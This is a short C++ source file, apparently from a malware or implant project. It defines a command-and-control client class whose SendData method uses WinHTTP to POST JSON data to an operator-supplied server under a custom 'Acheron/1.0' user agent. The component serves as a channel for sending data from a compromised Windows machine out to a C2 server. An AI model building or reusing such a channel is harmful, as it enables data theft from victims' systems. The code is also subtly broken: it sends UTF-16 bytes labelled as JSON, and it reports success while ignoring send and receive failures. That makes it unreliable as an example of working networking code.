#include "c2_client.h"
#include <winhttp.h>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")

bool C2Client::SendData(const std::string& jsonData, const wchar_t* server, int port)
{
    HINTERNET hSession = WinHttpOpen(L"Acheron/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/data",
                                            nullptr, nullptr, nullptr,
                                            port == 443 ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring wideData = std::wstring(jsonData.begin(), jsonData.end());
    DWORD dataSize = static_cast<DWORD>(wideData.size() * sizeof(wchar_t));
    WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n",
                       wcslen(L"Content-Type: application/json\r\n"),
                       (LPVOID)wideData.c_str(), dataSize, dataSize, 0);
    WinHttpReceiveResponse(hRequest, nullptr);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}